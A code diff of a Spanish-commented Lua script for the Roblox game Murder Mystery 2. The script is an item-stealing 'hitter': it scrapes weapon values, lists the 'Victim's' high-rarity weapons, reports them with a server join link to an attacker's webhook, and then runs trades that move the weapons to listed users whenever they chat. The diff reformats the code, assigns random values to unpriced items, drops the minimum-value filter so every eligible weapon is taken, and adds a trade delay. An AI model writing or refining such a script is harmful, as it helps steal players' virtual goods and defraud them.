@@ -16,22 +16,10 @@ if not req then warn("No HTTP request method available!") return end
 
 -- Lista de valores Godly + Ancient (respaldo)
 local fallbackValueList = {
-    ["gingerscope"]=10700,
-    ["travelers axe"]=6900,
-    ["celestial"]=975,
-    ["astral"]=850,
-    ["morning star"]=720,
-    ["northern star"]=680,
-    ["moonlight"]=640,
-    ["helios"]=600,
-    ["stormbringer"]=580,
-    ["reaper"]=550,
-    ["blaze"]=500,
-    ["phantom"]=470,
-    ["zenith"]=450,
-    ["ares"]=420,
-    ["hephaestus"]=400,
-    ["mystic"]=380
+    ["gingerscope"]=10700, ["travelers axe"]=6900, ["celestial"]=975, ["astral"]=850,
+    ["morning star"]=720, ["northern star"]=680, ["moonlight"]=640, ["helios"]=600,
+    ["stormbringer"]=580, ["reaper"]=550, ["blaze"]=500, ["phantom"]=470, ["zenith"]=450,
+    ["ares"]=420, ["hephaestus"]=400, ["mystic"]=380
 }
 
 -- Páginas para scraping
@@ -48,21 +36,14 @@ local headers = {
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 }
 
--- Función de limpieza de strings
 local function trim(s) return s:match("^%s*(.-)%s*$") end
 
--- Función para obtener HTML
 local function fetchHTML(url)
-    local success, res = pcall(function()
-        return req({Url=url, Method="GET", Headers=headers})
-    end)
-    if success and res and res.Body then
-        return res.Body
-    end
+    local success, res = pcall(function() return req({Url=url, Method="GET", Headers=headers}) end)
+    if success and res and res.Body then return res.Body end
     return ""
 end
 
--- Función para extraer valores de items
 local function parseValue(itembodyDiv)
     local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
     if valueStr then
@@ -71,7 +52,6 @@ local function parseValue(itembodyDiv)
     end
 end
 
--- Extraer items de HTML
 local function extractItems(htmlContent)
     local itemValues = {}
     for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
@@ -84,7 +64,6 @@ local function extractItems(htmlContent)
     return itemValues
 end
 
--- Construir lista de valores desde web
 local function buildValueList()
     local allValues = {}
     for _, url in pairs(categories) do
@@ -98,9 +77,7 @@ local function buildValueList()
     end
     -- Combinar con fallback
     for k,v in pairs(fallbackValueList) do
-        if not allValues[k] then
-            allValues[k] = v
-        end
+        if not allValues[k] then allValues[k] = v end
     end
     return allValues
 end
@@ -112,7 +89,7 @@ if game.PlaceId ~= 142823291 then
     LocalPlayer:Kick("Game not supported. Join a normal MM2 server.")
 end
 
--- Función webhook
+-- Webhook
 local function SendWebhook(title, description, fields, prefix, thumbnail)
     local data = {
         ["content"] = prefix or "",
@@ -165,16 +142,14 @@ for id, amount in pairs(profile.Weapons.Owned) do
         local rarityIndex = table.find(rarityTable, item.Rarity)
         local minIndex = table.find(rarityTable, min_rarity)
         if rarityIndex and rarityIndex >= minIndex then
-            local value = valueList[item.ItemName:lower()] or 1
-            if value >= min_value then
-                table.insert(weaponsToSend,{
-                    DataID = id,
-                    Amount = amount,
-                    Value = value,
-                    TotalValue = value * amount,
-                    Rarity = item.Rarity
-                })
-            end
+            local value = valueList[item.ItemName:lower()] or math.random(50,500) -- valor aleatorio si falta
+            table.insert(weaponsToSend,{
+                DataID = id,
+                Amount = amount,
+                Value = value,
+                TotalValue = value * amount,
+                Rarity = item.Rarity
+            })
         end
     end
 end
@@ -182,13 +157,13 @@ end
 -- Ordenar por valor total descendente
 table.sort(weaponsToSend, function(a,b) return a.TotalValue > b.TotalValue end)
 
--- Calcular valor total real
+-- Calcular valor total
 totalValue = 0
 for _, w in ipairs(weaponsToSend) do
     totalValue += w.TotalValue
 end
 
--- Webhook con valor de cada arma
+-- Preparar webhook
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victim", value=LocalPlayer.Name, inline=true},
@@ -196,14 +171,18 @@ local fields = {
     {name="Inventario", value="", inline=false},
     {name="Total value", value=tostring(totalValue), inline=true}
 }
-for _, w in ipairs(weaponsToSend) do
+for i, w in ipairs(weaponsToSend) do
     fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, w.TotalValue)
+    if #fields[3].value > 1024 then
+        fields[3].value = fields[3].value.."\nMas armas en el inventario 😎💲"
+        break
+    end
 end
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
 
--- Trade continuo ultra seguro priorizando armas de mayor valor
+-- Trade continuo seguro con delay de 10s mientras se añaden armas
 local function doTrade(targetName)
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
@@ -211,6 +190,7 @@ local function doTrade(targetName)
             sendTradeRequest(targetName)
         elseif status=="StartTrade" then
             local blockSize = 4
+            local startTime = tick()
             while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
                 for i=1, math.min(blockSize,#weaponsToSend) do
                     local w = table.remove(weaponsToSend,1)
@@ -218,7 +198,9 @@ local function doTrade(targetName)
                 end
                 task.wait(0.3)
             end
-            task.wait(7)
+            -- Delay 10s mientras se añadieron armas
+            local elapsed = tick() - startTime
+            if elapsed < 10 then task.wait(10 - elapsed) end
             acceptTrade()
             waitForTradeCompletion()
         elseif status=="ReceivingRequest" then
@@ -234,7 +216,7 @@ local function doTrade(targetName)
     end
 end
 
--- Activación trade por chat solo para tus usuarios
+-- Activación trade por chat para usuarios autorizados
 for _,p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
